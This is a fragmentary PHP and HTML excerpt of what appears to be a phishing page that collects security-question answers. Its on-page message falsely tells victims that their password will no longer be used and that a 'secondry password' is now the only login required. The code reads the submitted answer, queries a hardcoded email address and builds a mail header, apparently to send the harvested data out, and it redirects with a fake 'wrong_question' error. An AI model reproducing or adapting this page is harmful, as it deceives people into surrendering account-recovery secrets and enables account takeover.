...
if(isset($_POST['submit'])) { //IF LOGIN BTN HAS BEEN CLICKED
    if(!empty($_POST['secq'])) { //CHECK IF NOTHING WAS SELECTED
       
        $email = mysqli_real_escape_string($conn, $_POST['email']);
        $sql = "SELECT * FROM users where email='trustme@gmail.com'";
...
'X-Mailer: PHP/' . phpversion();
        ...
        // $login_err = $_POST['cp'];
        echo "<script type='text/javascript'> document.location = 'verify_sec_question.php?error=wrong_question'; </script>";
        //   header('Location: panel.php');
    }
        ...
        <div class="container form-div">
            <div class="row">
                <div class="col-xs-12" style="background-color: white;">
                    <form role="form" class="register-form" method="POST" action="verify_sec_question.php"
                        ...
                        <div class="alert alert-info alert-dismissible" role="alert">
                            ...
                            <p style="color: black;">If you have previously set up a password, it will no longer be
                                used, Your secondry password is now the <strong>ONLY</strong> password required to log
                                on.</p>
                            ...
                            <div style="padding-left: 10px; padding-right: 10px">
                                <div
                                    ...
                                    <p style="margin-bottom: 0px; font-weight: bold; font-size: 12px">Please enter your
                                        your security question</p><i style="font-size:24px;" class="fa">&#xf06a;</i>

                                </div>

                            </div>
                            <input type="text" name="secq" style="padding: 5px;" required>
                            <hr class="colorgraph">
